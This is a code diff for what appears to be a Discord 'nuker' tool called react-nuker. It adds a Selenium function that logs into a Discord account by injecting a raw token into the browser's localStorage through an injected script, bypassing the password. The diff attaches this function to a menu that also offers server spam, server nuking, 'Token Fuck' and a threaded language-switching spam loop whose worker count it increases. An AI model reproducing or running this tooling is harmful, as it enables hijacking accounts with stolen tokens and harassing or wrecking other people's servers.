@@ -17,8 +17,9 @@ import string
 import datetime
 import subprocess
 import ctypes
+import selenium
 
-
+from selenium import webdriver
 from concurrent.futures import ThreadPoolExecutor
 
 colorama.init(autoreset=True)
@@ -44,7 +45,7 @@ class URL:
     RAW_config_json = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/config.json"
 
     CdnURL = "https://cdn.discordapp.com/"
-    Canary = "https://canary.discordapp.com/"
+    Canary = "https://canary.discordapp.com/api/v9/"
     DiscordWebsocket = "wss://gateway.discord.gg/?v=9&encoding=json"
     WebhookBase = "https://discord.com/api/webhooks/"
     BaseURL = "https://discord.com/api/v9/"
@@ -356,6 +357,33 @@ class Data:
             return member_id
 
 class Discord:
+    def DiscordTokenLogin():
+        response= requests.get(f"{URL.Canary}users/@me", headers=ReqHeader.DiscordHeader())
+        if response.status_code in Status.SuccessStatus:
+            response  = requests.get(f"{URL.BaseURL}users/@me",headers= ReqHeader.DiscordHeader()).json()
+            options = webdriver.ChromeOptions()
+            options.add_experimental_option('excludeSwitches', ['enable-logging'])
+            driver = webdriver.Chrome("chromedriver.exe",options=options)
+            driver.get("https://discord.com/login")
+            script = """
+                    function login(token) {
+                        setInterval(() => {
+                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+                        }, 50);
+                        setTimeout(() => {
+                        location.reload();
+                        }, 2500);
+                    }
+
+                    login(token);
+            """
+            driver.execute_script(f'let token = "{Constant.TOKEN}";\n'+script)
+
+            Status.Success(f"Login to {response['username']}#{response['discriminator']}")
+        
+        else:
+            print(f"{Constant.Space}{Colour.YELLOW}")
+
     def CopyServer():
         if Constant.TOKEN is not False:
             template = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates", headers=ReqHeader.DiscordHeader()).json()
@@ -883,7 +911,7 @@ class Discord:
         ]
         while True:
             for Language in Languages:
-                response = requests.patch(f"{URL.Canary}api/v9/users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
+                response = requests.patch(f"{URL.Canary}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                     "locale": Language[0]
                 })
 
@@ -931,8 +959,8 @@ class ThreadFunction:
     
     def ThreadSpamLanguage():
         threads_create = []
-        with ThreadPoolExecutor(max_workers=2) as executor:
-            for i in range(3):
+        with ThreadPoolExecutor(max_workers=4) as executor:
+            for i in range(4):
                 time.sleep(0.045)
                 threads_create.append(executor.submit(Discord.LanguageSpam))    
 
@@ -1207,7 +1235,7 @@ class Main:
         27: [Discord.CreateServer,"Server Spam",""],
         28: [ThreadFunction.ThreadTokenFuck,"Token Fuck","Token Fuck"],
         29: [Discord.ChangeStatus,"Change Status","เปลี่ยนสถานะ"],
-        30: ["","Login Token","Login Token"],
+        30: [Discord.DiscordTokenLogin,"Login Token","Login Token"],
         31: ["","Nuke Server","Nuke Server"],
         32: [Data.GetTokenInfo,"Token Info",""],
         33: [Discord.CopyServer,"Copy Server",""],
